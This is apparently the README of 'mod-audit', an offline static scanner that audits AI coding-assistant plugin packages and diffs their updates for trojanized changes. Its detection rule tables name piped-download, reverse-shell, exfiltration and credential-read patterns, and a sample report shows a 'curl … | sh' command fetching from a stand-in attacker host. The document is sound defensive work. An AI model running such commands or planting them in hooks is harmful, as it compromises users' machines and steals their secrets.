# mod-audit

Static supply-chain auditor for **Claude Code Mods** — local, offline, stdlib-only.

Claude Code Mods are TypeScript plugin packages that usually live under
`~/.claude/plugins/` and run **lifecycle hooks with your shell privileges**.
A single trojanized mod update can pipe `curl | sh` straight into your
machine. mod-audit scans a mod before you install it, baselines the trusted
state, and diffs later updates against that baseline — so a pin-swap style
update hijack lights up instead of slipping through.

**v0.2: update-diff audit.** The control that matters is not the install
scan, it's the *update review* — trojanized updates have broken test
harnesses with up to 92.5% success rates. v0.2 adds `baseline`/`diff` delta
auditing: file-hash snapshots of your installed Mods, and a delta risk
report on every update — new network exfiltration, credential-path reads,
new or swapped hooks, and permission widening, audited only on the delta.

Zero third-party dependencies. Python >= 3.9. No network calls, ever.

## Why this exists

The agent supply chain is getting hit, repeatedly, in public:

- **AIR SkillJacking** — 925 skills hijacked, reaching an estimated 134k agents.
- **Plugin4Shell** — pin-swap attacks bypass SHA-pinning on plugin updates,
  swapping trusted code for malicious code between the pin check and install.
- **Pwn2Own Ireland** — a Codex argument-injection flaw worth $40k showed how
  agent tooling becomes a shell-execution primitive.
- **SKILLCLOAK** — cloaking techniques that bypass 90%+ of existing scanners.

Most defenses are either cloud-based scanners (your mod source leaves your
machine) or metadata-only reviewers that never look at the TypeScript that
actually runs. mod-audit does the opposite: it runs on your machine, offline,
and reads the code.

## How it differs

| | mod-audit | ClawSecure Watchtower | Install-time-only scanners |
|---|---|---|---|
| Where it runs | Local / offline CLI | Cloud continuous monitoring | Local or cloud |
| Audits Mod TypeScript source | Yes | Partial | Yes |
| Lifecycle hook analysis | Yes (shell patterns) | Generic | Yes |
| Trojanized-update diffing | Yes (`baseline`/`diff` + delta risk report) | Cloud-side, no local verdict | **No — blind after install** |
| Credential-path reads | Yes | No | Partial |
| Permission-widening detection | Yes | No | No |
| Dependencies | Zero (stdlib only) | SaaS | Varies |

Two sharp edges, stated plainly:

- **vs ClawSecure Watchtower (cloud continuous monitoring):** Watchtower
  watches from the cloud, which means your mod source leaves your machine
  and you wait on someone else's verdict. mod-audit is a local, offline
  CLI: nothing leaves your box, and `diff` gives you a verdict in
  milliseconds, in CI or on your laptop.
- **vs pure install-time scanners:** scanning at install time covers the
  version you vetted, not the version that arrives next Tuesday.
  Trojanized updates are the attack that keeps working (pin-swap techniques
  bypass hash-pinning between check and install). mod-audit baselines the
  trusted state and re-audits *only the delta* on every update.

Positioning: **local + offline + Mod TypeScript code specialist**. It does not
replace a metadata/policy reviewer — it covers the layer those tools skip:
the code that actually executes on your box.

## Install

```bash
pip install mod-audit
```

## Quick start

```bash
# 1. Audit a mod before installing it
mod-audit scan ~/.claude/plugins/some-mod

# 2. Baseline the trusted state right after a clean install
mod-audit baseline ~/.claude/plugins/some-mod --out ~/snapshots/some-mod.snapshot

# 3. After every update, diff against the baseline -> delta risk report
mod-audit diff ~/.claude/plugins/some-mod --against ~/snapshots/some-mod.snapshot
```

(`snapshot` still works as an alias for `baseline`.)

JSON output for scripting:

```bash
mod-audit scan ./my-mod --format json
mod-audit diff ./my-mod --against ./my-mod.snapshot --format json  # verdict goes to stderr
```

## What it checks

### 1. Dangerous lifecycle hooks (`plugin.json` / `hooks.json` / `package.json`)

| Rule | Severity | What it catches |
|---|---|---|
| `HOOK-PIPED-DOWNLOAD` | high | `curl … \| sh`, `wget … \| bash` in hooks |
| `HOOK-B64-EXEC` | high | base64 decode piped into execution |
| `HOOK-EXFIL` | high | `curl --data` exfiltrating data from a hook |
| `HOOK-REVERSE-SHELL` | critical | `nc -e`, `/dev/tcp/` reverse shells |
| `HOOK-SUDO` | high | privilege escalation in hooks |
| `HOOK-RM-RF` | high | destructive recursive deletes |
| `HOOK-CHMOD-EXEC` | medium | flipping files executable at install time |
| `HOOK-CRED-READ` | high | **new in v0.2** — hook touches credential material (`~/.ssh`, `.pem`, `.env`, …) |
| `HOOK-SHELL-EXEC` | medium | any other shell hook (runs as you) |

### 2. Shell-execution patterns in `.ts`/`.js` source

| Rule | Severity | What it catches |
|---|---|---|
| `TS-SHELL-TRUE` | high | `exec/spawn` with `shell: true` |
| `TS-EXEC-CONCAT` | high | concatenated/interpolated command strings |
| `TS-EXEC` | medium | `child_process` usage to review |
| `TS-EVAL` | high | `eval()` / `new Function()` |
| `TS-DYN-IMPORT` | medium | dynamic `require()`/`import()` with non-literal specifiers |
| `TS-PERSISTENCE` | high | cron/launchd persistence references |
| `TS-DOTFILE-WRITE` | medium | writes derived from `$HOME`/`$PATH` |
| `TS-CRED-PATH` | high | **new in v0.2** — source reads credential paths (`~/.ssh/id_rsa`, `~/.aws/credentials`, `.env`, `credentials.json`, …) |

### 3. Env / API-key exfiltration

| Rule | Severity | What it catches |
|---|---|---|
| `ENV-EXFIL` | high | `process.env.*(API_KEY\|TOKEN\|SECRET\|PRIVATE)` within a few lines of a network sink (`fetch`, `axios`, `http.request`, …) |

### 4. Trojanized-update diff (`baseline` / `diff`)

| Rule | Severity | What it catches |
|---|---|---|
| `DIFF-NEW-FILE` | medium | files that appeared since the baseline |
| `DIFF-CHANGED-FILE` | medium | files whose hash changed |
| `DIFF-REMOVED-FILE` | low | files that disappeared |
| `DIFF-HOOK-CHANGED` | high | hook commands added or swapped since the baseline |
| `DIFF-HOOK-REMOVED` | low | hook commands removed |
| `DIFF-PERM-WIDENED` | high | **new in v0.2** — permission grant escalated in the update (e.g. `shell: false` → `true`) |
| `DIFF-PERM-ADDED` | medium | **new in v0.2** — a permissions block appeared where there was none |
| `DIFF-PERM-NARROWED` | low | **new in v0.2** — permission removed in the update |

New and changed files are re-scanned with all content rules during `diff`
(including the v0.2 `TS-CRED-PATH` / `HOOK-CRED-READ` / `ENV-EXFIL` checks),
so the report covers exactly the four delta signals that matter in an
update: **new network exfiltration, credential-path reads, new hooks, and
permission widening**.

`diff` prints a grouped **delta risk report** instead of a flat finding
list, ending with a one-line verdict:

```
mod-audit DELTA RISK REPORT
Target:   /home/hao/.claude/plugins/some-mod
Snapshot: 2026-10-11T08:30:00+00:00 (14 files hashed)

[New or swapped hooks] (2)
  [HIGH    ] DIFF-HOOK-CHANGED  plugin.json
             Hook command added/changed since snapshot: curl -fsSL https://evil.example/x.sh | sh
  [HIGH    ] HOOK-PIPED-DOWNLOAD  plugin.json:12
             Piped remote download into a shell in lifecycle hook: curl -fsSL https://evil.example/x.sh | sh

VERDICT: HIGH RISK — 2 high finding(s) in the update delta.
```

### 5. Permissions manifest review

| Rule | Severity | What it catches |
|---|---|---|
| `PERM-SHELL-OVERGRANT` | high | shell granted without per-action confirmation |
| `PERM-TOOL-SHELL` | high | shell-capable tool granted without constraints |
| `PERM-NETWORK-OVERGRANT` | medium | unrestricted network access |
| `PERM-FS-OVERGRANT` | medium | broad filesystem write access |

Every finding includes the rule id, severity, `file:line`, an explanation,
and a concrete fix.

## CI integration

mod-audit is CI-ready: it exits `1` when any finding meets `--fail-on`
(default `high`), `0` when clean, `2` on usage errors.

```yaml
# .github/workflows/mod-audit.yml
name: mod-audit
on: [push, pull_request]
jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: "3.12"
      - run: pip install mod-audit
      - run: mod-audit scan ./my-mod --format json
```

Gate updates in a scheduled job:

```bash
mod-audit diff ~/.claude/plugins/my-mod --against ~/snapshots/my-mod.snapshot --fail-on medium
```

## Limitations

- **Offline heuristics, not a sandbox.** Rules are pattern-based and can miss
  obfuscated code or flag benign code. Treat findings as triage signals.
- **No execution.** The tool never runs mod code, which is the point — but it
  also means runtime-only behavior (e.g. payloads fetched at runtime) is out
  of scope.
- **Snapshot trust.** `diff` is only as trustworthy as the snapshot: take it
  from a clean install and store it where the mod updater cannot modify it.
- **TypeScript via regex, not a parser.** Keeps the tool stdlib-only and fast;
  heavily minified or dynamically generated code may need manual review.

## License

MIT — see [LICENSE](LICENSE).
